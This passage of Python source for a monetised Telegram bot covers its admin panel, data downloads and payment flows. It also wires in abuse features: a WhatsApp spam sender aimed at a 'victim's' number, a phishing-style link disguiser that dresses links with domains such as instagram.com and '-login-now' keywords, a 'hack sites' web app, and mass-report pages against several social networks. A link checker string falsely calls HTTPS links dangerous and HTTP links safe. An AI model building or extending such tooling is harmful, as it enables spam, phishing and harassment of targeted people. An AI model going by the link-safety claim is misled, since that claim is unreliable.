                "whatsapp_spam_prompt": "❄️ Send the victim's WhatsApp number with country code (e.g., 15551234567):",
                "action_success": "✅ The action was executed successfully.",
                "ask_channel_id": "Send the channel ID without @",
                "ask_ban_id": "Send the ID of the user you want to ban",
                "ask_unban_id": "Send the ID of the user to unban",
                "ask_add_admin_id": "Send the user's ID to promote",
                "ask_rem_admin_id": "Send the admin's ID to demote",
                "ask_add_paid_id": "Send the user's ID to add to paid membership",
                "ask_rem_paid_id": "Send the user's ID to remove from paid membership",
                "ask_broadcast_msg": "Okay, send your message to be broadcast to all subscribers 📮",
                "ask_forward_msg": "Okay, forward the message to me now 🔄",
                "original_link_saved": "✅ Original link saved.\n\nEnter the custom domain (e.g., instagram.com):",
                "invalid_original_link": "❌ Invalid original link. It must start with http:// or https://",
                "domain_saved": "✅ Domain saved.\n\nEnter the keywords (e.g., -login-now):",
                "invalid_domain": "❌ Invalid domain format. Send a valid domain (e.g., example.com).",
                "disguised_links_header": "<b>[~] Disguised Links:</b>\n",
                "original_link_display": "<b>Original Link:</b> {}\n\n",
                "invalid_phone_number": "❌ Invalid phone number. Please send a correct number with country code.",
                "sending_spam": "⏳ Sending spam message...",
                "spam_sent_success": "✅ Spam message sent successfully!",
                "link_secure": "✅ <b>Safe.</b>\nThis link appears to use the standard HTTP protocol.",
                "link_insecure": "🚨 <b>Danger!</b>\nThis link was detected as potentially harmful because it uses the encrypted HTTPS protocol.",
                "link_unknown": "⚠️ Cannot determine link status. Please send a link starting with http or https.",
                "tts_processing": "⏳ Converting text to voice message...",
                "tts_error": "❌ An error occurred during conversion. Please try again later.",
                "service_busy": "❌ Sorry, the service is currently busy. Please try again later.",
                "zakhrafa_done": "<b>Decoration complete:</b>\n\n{}",
                "choose_zakhrafa_lang": "Choose the language of the text to decorate:",
                "ask_zakhrafa_text": "Send the text in <b>{}</b> to be decorated.",
                "lang_ar": "Arabic",
                "lang_en": "English",
                # --- Download Data Feature Texts (New) ---
                "download_data_header": "📥 Choose the data you want to download:",
                "download_users_button": "👥 Users",
                "download_admins_button": "👑 Admins",
                "download_banned_button": "🚫 Banned",
                "download_channels_button": "📢 Sub. Channels",
                "download_paid_users_button": "⭐ Paid Users",
                "file_not_found": "⚠️ File not found or is empty.",
                # --- Help Button Text ---
                "help_text": """📜 Terms of Use:

I, the user of the application, pledge that:

✅ I will not use the application in a way that angers God Almighty.
✅ I will not steal photos or accounts for the purpose of theft or spying on messages.
✅ I will use the application only for:
- Gentle joking.
- Lawful profit.
- Personal experimentation.
- Permitted advertising and promotions.

⚠️ I absolve the owner and administrator of the application from any misuse or violation that leads to sin or harm to others.

✨ Please use the application in a way that pleases God and preserves everyone's rights."""
            }
        }
        return locales.get(lang_code, locales["ar"])

    # --- قسم تغيير اللغة ---
    def language_panel(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("العربية 🇪🇬", callback_data="set_lang_ar"),
            InlineKeyboardButton("English 🇬🇧", callback_data="set_lang_en")
        )
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=locale["choose_language"], reply_markup=kb
            )
        except Exception as e:
            print(f"Error in language_panel: {e}")

    def set_language(call):
        lang_code = call.data.replace("set_lang_", "")
        set_setting(language_file, lang_code)
        locale = get_locale(lang_code)
        bot.answer_callback_query(call.id, locale["language_changed"], show_alert=True)
        admin_panel(call.message)

    # --- قسم تحميل البيانات (جديد) ---
    def download_data_panel(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton(locale["download_users_button"], callback_data="download_file_users.txt"),
            InlineKeyboardButton(locale["download_admins_button"], callback_data="download_file_admins.txt")
        )
        kb.row(
            InlineKeyboardButton(locale["download_banned_button"], callback_data="download_file_banned.txt"),
            InlineKeyboardButton(locale["download_channels_button"], callback_data="download_file_channels.txt")
        )
        kb.add(InlineKeyboardButton(locale["download_paid_users_button"], callback_data="download_file_paid_users.txt"))
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=locale["download_data_header"], reply_markup=kb
            )
        except Exception as e:
            print(f"Error in download_data_panel: {e}")

    def send_data_file(call):
        locale = get_locale()
        file_name = call.data.replace("download_file_", "")
        file_path = os.path.join(data_dir, file_name)
        
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            try:
                with open(file_path, "rb") as doc:
                    bot.send_document(call.message.chat.id, doc, caption=f"📄 `Here is the {file_name} file`")
                bot.answer_callback_query(call.id)
            except Exception as e:
                bot.answer_callback_query(call.id, f"Error sending file: {e}", show_alert=True)
        else:
            bot.answer_callback_query(call.id, locale["file_not_found"], show_alert=True)
    # --- منطق إعداد الدفع بالنجوم ---
    def show_stars_setup_info(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin")
        )
        setup_text = """
🌟 <b>متطلبات تفعيل الدفع بنجوم تيليجرام (Telegram Stars)</b>

1️⃣  اذهب إلى @BotFather > `/mybots` > اختر هذا البوت.
2️⃣  اختر "Payments" ثم اختر مزود دفع (مثل Stripe) واتبع التعليمات.
3️⃣  بعد الربط، أرسل الأمر التالي هنا في بوتك:
    `/stars <توكن_مزود_الدفع>`

<b>مثال:</b> `/stars 123456:TEST:abcdefg`
"""
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=setup_text, reply_markup=kb
            )
        except Exception as e:
            print(f"Error in show_stars_setup_info: {e}")

    @bot.message_handler(commands=['stars'])
    def set_stars_provider_token(message):
        user_id = str(message.from_user.id)
        if not is_admin(user_id):
            bot.reply_to(message, "❌ هذا الأمر مخصص للمسؤولين فقط.")
            return
        try:
            provider_token = message.text.split(' ', 1)[1]
        except IndexError:
            bot.reply_to(message, "⚠️ صيغة الأمر خاطئة. أرسل:\n`/stars <توكن_مزود_الدفع>`")
            return
        stars_config = get_json_data(stars_config_file)
        stars_config['provider_token'] = provider_token
        save_json_data(stars_config_file, stars_config)
        bot.reply_to(message, "✅ تم حفظ توكن مزود الدفع.\n\nالآن، أرسل عدد النجوم المطلوب لكل <b>يوم</b> اشتراك.")
        set_state(user_id, {"action": "set_stars_per_day"})

    def set_stars_per_day(message):
        user_id = str(message.from_user.id)
        if not is_admin(user_id): return
        try:
            stars_per_day = int(message.text.strip())
            if stars_per_day <= 0:
                bot.reply_to(message, "❌ يرجى إرسال عدد نجوم أكبر من صفر.")
                return
        except ValueError:
            bot.reply_to(message, "❌ يرجى إرسال أرقام فقط.")
            return
        stars_config = get_json_data(stars_config_file)
        stars_config['stars_per_day'] = stars_per_day
        save_json_data(stars_config_file, stars_config)
        bot.reply_to(message, f"✅ تم الحفظ! سعر الاشتراك الآن هو <b>{stars_per_day}</b> نجمة لكل يوم.")
        set_state(user_id, None)

    # --- دالة بناء لوحة تحكم الأدمن (مُحدّثة بالكامل) ---
    def get_admin_panel():
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        total_users = len(get_lines(subscribers_file))
        
        kb.row(InlineKeyboardButton(locale["subscribers_count"].format(total_users), callback_data="m1"))
        kb.row(
            InlineKeyboardButton(locale["broadcast_button"], callback_data="send"),
            InlineKeyboardButton(locale["forward_button"], callback_data="forward")
        )
        kb.row(
            InlineKeyboardButton(locale["add_channel_button"], callback_data="add_ch"),
            InlineKeyboardButton(locale["delete_channel_button"], callback_data="del_ch")
        )
        kb.row(
            InlineKeyboardButton(locale["notify_on_button"], callback_data="ons"),
            InlineKeyboardButton(locale["notify_off_button"], callback_data="ofs")
        )
        kb.row(
            InlineKeyboardButton(locale["bot_on_button"], callback_data="obot"),
            InlineKeyboardButton(locale["bot_off_button"], callback_data="ofbot")
        )
        kb.row(
            InlineKeyboardButton(locale["ban_button"], callback_data="ban"),
            InlineKeyboardButton(locale["unban_button"], callback_data="unban")
        )
        kb.row(
            InlineKeyboardButton(locale["add_admin_button"], callback_data="add_admin"),
            InlineKeyboardButton(locale["rem_admin_button"], callback_data="rem_admin")
        )
        kb.row(
            InlineKeyboardButton(locale["paid_mode_button"], callback_data="set_paid"),
            InlineKeyboardButton(locale["free_mode_button"], callback_data="set_free")
        )
        kb.row(
            InlineKeyboardButton(locale["add_paid_button"], callback_data="add_paid"),
            InlineKeyboardButton(locale["rem_paid_button"], callback_data="rem_paid")
        )
        kb.add(InlineKeyboardButton(locale["set_stars_button"], callback_data="setup_stars_payment"))
        
        if has_premium_features():
            kb.row(
                InlineKeyboardButton(locale["manage_payment_button"], callback_data="manage_payment_methods"),
                InlineKeyboardButton(locale["buttons_section_button"], callback_data="manage_buttons")
            )
            kb.add(InlineKeyboardButton(locale["change_language_button"], callback_data="change_language"))

        kb.add(InlineKeyboardButton(locale["download_data_button"], callback_data="download_data"))
        kb.add(InlineKeyboardButton(locale["edit_start_msg_button"], callback_data="set_start_msg"))
        return kb

    @bot.message_handler(commands=['admin'])
    def admin_panel(message):
        if not is_admin(message.from_user.id): return
        set_state(message.from_user.id, None)
        locale = get_locale()
        kb = get_admin_panel()
        bot.send_message(message.chat.id, locale["welcome_panel"], reply_markup=kb)

    # --- دالة /start الكاملة والصحيحة (مُحدّثة بالكامل) ---
    @bot.message_handler(commands=['start'])
    def start_new(message):
        user_id = str(message.from_user.id)
        locale = get_locale()
        
        try:
            inviter_id = message.text.split()[1]
            invited_by_file = os.path.join(data_dir, "invited_by.json")
            invited_users = get_json_data(invited_by_file)
            if user_id not in invited_users and user_id != inviter_id:
                invited_users[user_id] = inviter_id
                save_json_data(invited_by_file, invited_users)
                add_user_points(inviter_id, 1)
                try:
                    bot.send_message(inviter_id, f"🎉 A new user joined via your link! You got 1 point.\nYour current balance: {get_user_points(inviter_id)} points.")
                except: pass
        except (IndexError, ValueError): pass

        if not is_bot_enabled() and not is_admin(user_id):
            bot.send_message(message.chat.id, locale["bot_under_maintenance"])
            return
        if is_user_banned(user_id):
            bot.send_message(message.chat.id, locale["user_banned"])
            return

        is_subscribed, not_subscribed_channels = is_user_subscribed(user_id)
        if not is_subscribed:
            kb = InlineKeyboardMarkup(row_width=2)
            for ch in not_subscribed_channels:
                kb.add(InlineKeyboardButton(f"📢 Subscribe to @{ch}", url=f"https://t.me/{ch}"))
            kb.add(InlineKeyboardButton(locale["subscribed_button"], callback_data="check_force_sub"))
            bot.send_message(message.chat.id, locale["must_subscribe"], reply_markup=kb)
            return

        if is_paid_mode() and not is_admin(user_id) and not is_paid_user(user_id):
            kb = InlineKeyboardMarkup(row_width=2)
            payment_methods = get_json_data(payment_methods_file)
            if payment_methods and has_premium_features():
                kb.add(InlineKeyboardButton("💳 Subscribe (Regular Payment)", callback_data="subscribe_start"))
            stars_config = get_json_data(stars_config_file)
            if stars_config.get('provider_token') and stars_config.get('stars_per_day') and has_premium_features():
                kb.add(InlineKeyboardButton("🌟 Subscribe (Pay with Stars)", callback_data="subscribe_stars_start"))
            
            if kb.keyboard:
                 kb.row(InlineKeyboardButton(locale["contact_developer_button"], url=f"tg://user?id={owner_id}"))
            else:
                 kb.add(InlineKeyboardButton(locale["contact_developer_button"], url=f"tg://user?id={owner_id}"))

            bot.send_message(
                message.chat.id,
                """<b>Welcome! 🌟</b>\n\nTo take full advantage of the bot's features, please subscribe to one of the paid plans.""",
                reply_markup=kb
            )
            return

        if user_id not in get_lines(subscribers_file):
            add_line(subscribers_file, user_id)

        start_message_text = get_setting(start_message_file, locale["welcome_user"])
        
        # --- بناء الأزرار الجديدة (مُحدّث حسب طلبك) ---
        kb = InlineKeyboardMarkup(row_width=2)
        hidden_buttons = get_json_data(hidden_buttons_file)
        
        # أزرار الويب أبلكيشن الجديدة
        web_app_buttons = {
            "hack_sites": (locale["hack_sites_btn"], "https://max.powerv1.site/pag/x.php"),
            "xo_game": (locale["xo_game_btn"], "https://max.powerv1.site/pag/x.html"),
            "facebook_reports": (locale["facebook_reports_btn"], "https://yyitoog.alwaysdata.net/ppppppmm/klash_facebook_report.php"),
            "twitter_reports": (locale["twitter_reports_btn"], "https://yyitoog.alwaysdata.net/ppppppmm/klash_twitter_report.php"),
            "virtual_numbers": (locale["virtual_numbers_btn"], "https://yyitoog.alwaysdata.net/ppppppmm/klash_virtual_numbers_app.php"),
            "tiktok_reports": (locale["tiktok_reports_btn"], "https://yyitoog.alwaysdata.net/ppppppmm/klash_tiktok_app.php"),
            "link_shortener": (locale["link_shortener_btn"], "https://linksshortcut.com/"),
            "name_decorator": (locale["name_decorator_btn"], "https://charactercalculator.com/ar/font-changer/"),
            "website_checker": (locale["website_checker_btn"], "https://builtwith.com/"),
            # الأزرار الجديدة المطلوبة
            "instagram_reports": (locale["instagram_reports_btn"], "https://yyitoog.alwaysdata.net/ppppppmm/klash_ig_report.php"),
            "telegram_reports": (locale["telegram_reports_btn"], "https://yyitoog.alwaysdata.net/ppppppmm/tg_report.php"),
            "whatsapp_reports": (locale["whatsapp_reports_btn"], "https://yyitoog.alwaysdata.net/ppppppmm/klash_whatsapp_report.php"),
            "ip_info": (locale["ip_info_btn"], "https://roxip.pages.dev/"),
            "translation": (locale["translation_btn"], "https://transla.pages.dev/")
        }
        
        buttons_to_show = []
        for btn_id, (btn_text, btn_url) in web_app_buttons.items():
            if btn_id not in hidden_buttons:
                buttons_to_show.append(InlineKeyboardButton(btn_text, web_app=WebAppInfo(btn_url)))

        for i in range(0, len(buttons_to_show), 2):
            row = buttons_to_show[i:i+2]
            kb.row(*row)
        
        # زر التعليمات
        kb.add(InlineKeyboardButton(locale["help_button"], callback_data="show_help"))
        
        # زر المطور
        kb.add(InlineKeyboardButton(locale["contact_developer_button"], url=f"tg://user?id={owner_id}"))
        
        bot.send_message(message.chat.id, start_message_text, reply_markup=kb, disable_web_page_preview=True)
    
    # --- دالة عرض التعليمات ---
    def show_help(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(InlineKeyboardButton(locale["back_button"], callback_data="back_to_main"))
        
        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=locale["help_text"],
            reply_markup=kb
        )
    # --- بداية منطق إدارة الأزرار المخصصة ---
    def buttons_management_panel(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("➕ Add New Button", callback_data="add_custom_button"),
            InlineKeyboardButton("🗑️ Delete Button", callback_data="delete_custom_button")
        )
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="🎛️ <b>Buttons Management Section</b>\n\nChoose the action you want to perform:",
                reply_markup=kb
            )
        except Exception as e:
            print(f"Error in buttons_management_panel: {e}")

    def show_buttons_for_deletion(call):
        locale = get_locale()
        custom_buttons = get_json_data(custom_buttons_file)
        hidden_buttons = get_json_data(hidden_buttons_file)
        
        kb = InlineKeyboardMarkup(row_width=1)
        
        web_app_buttons = {
            "hack_sites": locale["hack_sites_btn"],
            "xo_game": locale["xo_game_btn"],
            "facebook_reports": locale["facebook_reports_btn"],
            "twitter_reports": locale["twitter_reports_btn"],
            "virtual_numbers": locale["virtual_numbers_btn"],
            "tiktok_reports": locale["tiktok_reports_btn"],
            "link_shortener": locale["link_shortener_btn"],
            "name_decorator": locale["name_decorator_btn"],
            "website_checker": locale["website_checker_btn"],
            # الأزرار الجديدة
            "instagram_reports": locale["instagram_reports_btn"],
            "telegram_reports": locale["telegram_reports_btn"],
            "whatsapp_reports": locale["whatsapp_reports_btn"],
            "ip_info": locale["ip_info_btn"],
            "translation": locale["translation_btn"],
            "show_help": locale["help_button"]
        }
        
        all_buttons = web_app_buttons.copy()
        for btn_id, btn_data in custom_buttons.items():
            all_buttons[btn_id] = btn_data['text']

        if not all_buttons:
            bot.answer_callback_query(call.id, "No buttons to delete.", show_alert=True)
            return

        for btn_id, btn_text in all_buttons.items():
            if btn_id not in hidden_buttons:
                kb.add(InlineKeyboardButton(f"🗑️ {btn_text}", callback_data=f"confirm_delete_{btn_id}"))

        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="manage_buttons"))
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="Choose the button you want to delete (hide):",
            reply_markup=kb
        )

    def confirm_button_deletion(call):
        btn_id_to_delete = call.data.replace("confirm_delete_", "")
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("✅ Yes, delete", callback_data=f"execute_delete_{btn_id_to_delete}"),
            InlineKeyboardButton("❌ No, go back", callback_data="delete_custom_button")
        )
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"Are you sure you want to delete (hide) this button?",
            reply_markup=kb
        )

    def execute_button_deletion(call):
        btn_id_to_hide = call.data.replace("execute_delete_", "")
        hidden_buttons = get_json_data(hidden_buttons_file)
        
        if btn_id_to_hide not in hidden_buttons:
            hidden_buttons.append(btn_id_to_hide)
            save_json_data(hidden_buttons_file, hidden_buttons)
        
        bot.answer_callback_query(call.id, "✅ Button deleted (hidden) successfully.")
        show_buttons_for_deletion(call)

    def ask_for_button_text(call):
        locale = get_locale()
        set_state(call.from_user.id, {"action": "add_button_text"})
        kb = InlineKeyboardMarkup(row_width=2).row(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="Send the new button's name now (e.g., Tutorial Channel 📢).",
            reply_markup=kb
        )

    def ask_for_button_type(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        button_text = message.text.strip()
        set_state(user_id, {"action": "add_button_type", "text": button_text})
        
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("🌐 Direct Link (URL)", callback_data="btn_type_url"),
            InlineKeyboardButton("📲 Mini App (WebApp)", callback_data="btn_type_webapp")
        )
        kb.add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        
        bot.send_message(user_id, "Choose the button type:", reply_markup=kb)

    def ask_for_button_link(call):
        locale = get_locale()
        user_id = str(call.from_user.id)
        state = get_state(user_id)
        btn_type = call.data.replace("btn_type_", "")
        state["type"] = btn_type
        state["action"] = "add_button_link"
        set_state(user_id, state)
        
        kb = InlineKeyboardMarkup(row_width=2).row(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="Now, send the link for the button:",
            reply_markup=kb
        )

    def save_custom_button(message):
        user_id = str(message.from_user.id)
        state = get_state(user_id)
        button_link = message.text.strip()
        
        custom_buttons = get_json_data(custom_buttons_file)
        new_button_id = f"custom_{int(time.time())}"
        
        custom_buttons[new_button_id] = {
            "text": state["text"],
            "type": state["type"],
            "link": button_link
        }
        
        save_json_data(custom_buttons_file, custom_buttons)
        bot.send_message(user_id, f"✅ Button '<b>{state['text']}</b>' saved successfully!")
        set_state(user_id, None)
        
        from telebot.types import CallbackQuery, Message, User, Chat
        user = User(message.from_user.id, message.from_user.first_name, is_bot=False)
        chat = Chat(message.chat.id, 'private')
        msg = Message(message_id=message.message_id, from_user=user, date=None, chat=chat, content_type='text', options={}, json_string="")
        call = CallbackQuery(id='dummy_call', from_user=user, data='manage_buttons', chat_instance=None, json_string="", message=msg)
        bot.send_message(message.chat.id, "List updated:")
        buttons_management_panel(call)

    # --- بداية منطق الدفع بالعملات العادية (للبوت المصنوع) ---
    def payment_management_panel(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        payment_methods = get_json_data(payment_methods_file)
        response_text = "💳 <b>Manage Payment Methods</b>\n\n"
        if payment_methods:
            response_text += "Current payment methods:\n"
            for method_name in payment_methods:
                kb.add(InlineKeyboardButton(f"🗑️ Delete: {method_name}", callback_data=f"delete_payment_{method_name}"))
        else:
            response_text += "No payment methods added yet."
        kb.add(InlineKeyboardButton("➕ Add New Payment Method", callback_data="add_payment_method"))
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=response_text, reply_markup=kb
            )
        except Exception as e:
            print(f"Error in payment_management_panel: {e}")

    def ask_for_payment_method_type(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        wallets = ["Vodafone Cash", "Etisalat Cash", "Orange Cash", "We Pay", "Binance", "Payeer", "Perfect Money", "Other"]
        buttons = [InlineKeyboardButton(w, callback_data=f"payment_type_{w}") for w in wallets]
        
        # تنظيم الأزرار في صفوف من زرين
        for i in range(0, len(buttons), 2):
            if i+1 < len(buttons):
                kb.row(buttons[i], buttons[i+1])
            else:
                kb.add(buttons[i])
                
        kb.add(InlineKeyboardButton(locale["cancel_button"], callback_data="manage_payment_methods"))
        bot.edit_message_text(
            chat_id=call.message.chat.id, message_id=call.message.message_id,
            text="Choose the wallet type you want to add:", reply_markup=kb
        )

    def ask_for_payment_method_name(call):
        locale = get_locale()
        wallet_type = call.data.split('_')[-1]
        prompt_message = f"Now, send the specific wallet name for <b>{wallet_type}</b>."
        set_state(call.from_user.id, {"action": "add_payment_name", "type": wallet_type})
        kb = InlineKeyboardMarkup(row_width=2).row(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        bot.edit_message_text(
            chat_id=call.message.chat.id, message_id=call.message.message_id,
            text=prompt_message, reply_markup=kb
        )

    def ask_for_payment_address(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        state = get_state(user_id)
        state["name"] = message.text.strip()
        state["action"] = "add_payment_address"
        set_state(user_id, state)
        kb = InlineKeyboardMarkup(row_width=2).row(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        bot.send_message(user_id, "Now, send the wallet address or phone number.", reply_markup=kb)

    def ask_for_payment_price(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        state = get_state(user_id)
        state["address"] = message.text.strip()
        state["action"] = "add_payment_price"
        set_state(user_id, state)
        kb = InlineKeyboardMarkup(row_width=2).row(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        bot.send_message(user_id, "Now, send the subscription price <b>per month</b> (numbers only).", reply_markup=kb)

    def save_payment_method(message):
        user_id = str(message.from_user.id)
        state = get_state(user_id)
        try:
            price = float(message.text.strip())
        except ValueError:
            bot.reply_to(message, "❌ Invalid price. Please send a number only.")
            return
        method_name = state["name"]
        method_address = state["address"]
        payment_methods = get_json_data(payment_methods_file)
        payment_methods[method_name] = {"address": method_address, "price_per_month": price}
        save_json_data(payment_methods_file, payment_methods)
        bot.send_message(user_id, f"✅ Payment method '<b>{method_name}</b>' saved successfully.")
        set_state(user_id, None)
        
        from telebot.types import CallbackQuery, Message, User, Chat
        user = User(message.from_user.id, message.from_user.first_name, is_bot=False)
        chat = Chat(message.chat.id, 'private')
        msg = Message(message_id=message.message_id, from_user=user, date=None, chat=chat, content_type='text', options={}, json_string="")
        call = CallbackQuery(id='dummy_call', from_user=user, data='manage_payment_methods', chat_instance=None, json_string="", message=msg)
        bot.send_message(message.chat.id, "List updated:")
        payment_management_panel(call)

    def delete_payment_method(call):
        method_to_delete = call.data.replace("delete_payment_", "")
        payment_methods = get_json_data(payment_methods_file)
        if method_to_delete in payment_methods:
            del payment_methods[method_to_delete]
            save_json_data(payment_methods_file, payment_methods)
            bot.answer_callback_query(call.id, f"✅ '{method_to_delete}' has been deleted successfully.")
            payment_management_panel(call)
        else:
            bot.answer_callback_query(call.id, "❌ This payment method no longer exists.", show_alert=True)

    def show_subscription_options(call):
        locale = get_locale()
        payment_methods = get_json_data(payment_methods_file)
        if not payment_methods:
            bot.answer_callback_query(call.id, "⚠️ No payment methods are currently available.", show_alert=True)
            return
        kb = InlineKeyboardMarkup(row_width=2)
        for method_name in payment_methods.keys():
            kb.add(InlineKeyboardButton(f"Pay with {method_name}", callback_data=f"pay_via_{method_name}"))
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_start_paid"))
        bot.edit_message_text(
            chat_id=call.message.chat.id, message_id=call.message.message_id,
            text="Choose your preferred payment method:", reply_markup=kb
        )

    def show_package_options(call):
        locale = get_locale()
        method_name = call.data.replace("pay_via_", "")
        kb = InlineKeyboardMarkup(row_width=2)
        packages = {"1 Month": 1, "3 Months": 3, "6 Months": 6, "12 Months": 12}
        for text, months in packages.items():
            kb.add(InlineKeyboardButton(text, callback_data=f"package_{method_name}_{months}"))
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="subscribe_start"))
        bot.edit_message_text(
            chat_id=call.message.chat.id, message_id=call.message.message_id,
            text=f"Choose the package duration for payment via <b>{method_name}</b>:", reply_markup=kb
        )

    def process_package_selection(call):
        locale = get_locale()
        parts = call.data.split('_')
        method_name, months = parts[1], int(parts[2])
        method_details = get_json_data(payment_methods_file).get(method_name)
        if not method_details:
            bot.answer_callback_query(call.id, "❌ Payment method is no longer available.", show_alert=True)
            return
        total_price = method_details["price_per_month"] * months
        address = method_details["address"]
        set_state(call.from_user.id, {"action": "awaiting_payment_proof", "method": method_name, "months": months, "price": total_price})
        kb = InlineKeyboardMarkup(row_width=2).row(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        response_text = f"""
✅ <b>Payment details for a {months}-month subscription:</b>
<b>- Amount due:</b> <code>{total_price}</code>
<b>- Payment method:</b> {method_name}
<b>- Address/Number:</b> <code>{address}</code>
⚠️ After transferring, send a <b>screenshot of the receipt</b> or the <b>transaction ID</b> here.
"""
        bot.edit_message_text(
            chat_id=call.message.chat.id, message_id=call.message.message_id,
            text=response_text, reply_markup=kb
        )

    def forward_payment_proof_to_admin(message):
        user_id = str(message.from_user.id)
        state = get_state(user_id)
        if not state or state.get("action") != "awaiting_payment_proof": return
        method, months, price = state["method"], state["months"], state["price"]
        admin_message = f"🔔 <b>New Subscription Request</b>\n- User: <a href='tg://user?id={user_id}'>{message.from_user.first_name}</a> (<code>{user_id}</code>)\n- Package: {months} months ({price})\n- Method: {method}"
        kb = InlineKeyboardMarkup(row_width=2).row(
            InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}_{months}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
        )
        for admin_id in get_lines(admins_file):
            try:
                bot.send_message(admin_id, admin_message, disable_web_page_preview=True)
                bot.forward_message(admin_id, user_id, message.message_id)
                bot.send_message(admin_id, "Please take an action:", reply_markup=kb)
            except Exception as e:
                print(f"Failed to send proof to admin {admin_id}: {e}")
        bot.reply_to(message, "✅ Your request has been received and sent for review.")
        set_state(user_id, None)

    def handle_payment_approval(call):
        user_to_approve = call.data.split('_')[1]
        add_line(paid_users_file, user_to_approve)
        bot.edit_message_text(
            chat_id=call.message.chat.id, message_id=call.message.message_id,
            text=f"✅ <b>Subscription for <code>{user_to_approve}</code> has been approved.</b>"
        )
        try:
            bot.send_message(user_to_approve, "🎉 Congratulations! Your subscription has been successfully confirmed.")
        except Exception as e:
            print(f"Failed to notify user {user_to_approve}: {e}")

    def handle_payment_rejection(call):
        user_to_reject = call.data.split('_')[1]
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.answer_callback_query(call.id, "🗑️ The request has been rejected.")
        except Exception as e:
            print(f"Error deleting rejection message: {e}")
        try:
            bot.send_message(user_to_reject, "❌ We are sorry, your subscription request has been rejected.")
        except Exception as e:
            print(f"Failed to notify user {user_to_reject}: {e}")
    # --- منطق الدفع بالنجوم للمستخدم (للاشتراك في البوت) ---
    def ask_for_subscription_days(call):
        locale = get_locale()
        set_state(call.from_user.id, {"action": "awaiting_days_for_stars"})
        kb = InlineKeyboardMarkup(row_width=2).row(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        bot.edit_message_text(
            chat_id=call.message.chat.id, message_id=call.message.message_id,
            text="How many days do you want to subscribe to the bot?\n\nSend the number of days (e.g., 30).",
            reply_markup=kb
        )

    def create_stars_invoice(message):
        user_id = str(message.from_user.id)
        try:
            days = int(message.text.strip())
            if days <= 0:
                bot.reply_to(message, "❌ Please send a number of days greater than zero.")
                return
        except ValueError:
            bot.reply_to(message, "❌ Please send numbers only.")
            return
        stars_config = get_json_data(stars_config_file)
        provider_token = stars_config.get('provider_token')
        stars_per_day = stars_config.get('stars_per_day')
        if not provider_token or not stars_per_day:
            bot.reply_to(message, "⚠️ Sorry, the Stars payment service is not currently configured by the bot owner.")
            return
        total_stars = days * stars_per_day
        prices = [LabeledPrice(label=f"Subscription for {days} days", amount=total_stars)]
        invoice_payload = f"stars-sub-{user_id}-{int(time.time())}"
        try:
            bot.send_invoice(
                chat_id=user_id, title=f"Bot Subscription",
                description=f"Premium subscription for {days} days for {total_stars} stars.",
                provider_token=provider_token, currency="XTR", prices=prices,
                invoice_payload=invoice_payload
            )
            set_state(user_id, None)
        except Exception as e:
            print(f"Error sending stars invoice: {e}")
            bot.send_message(user_id, "❌ An error occurred while creating the invoice.")

    # --- معالجات الدفع ---
    @bot.pre_checkout_query_handler(func=lambda query: True)
    def checkout_handler(pre_checkout_query):
        bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

    @bot.message_handler(content_types=["successful_payment"])
    def successful_payment_handler(message):
        user_id = str(message.from_user.id)
        payload = message.successful_payment.invoice_payload

        if payload.startswith("stars-sub"):
            add_line(paid_users_file, user_id)
            bot.send_message(message.chat.id, "🎉 Your subscription has been confirmed successfully! Thank you.")
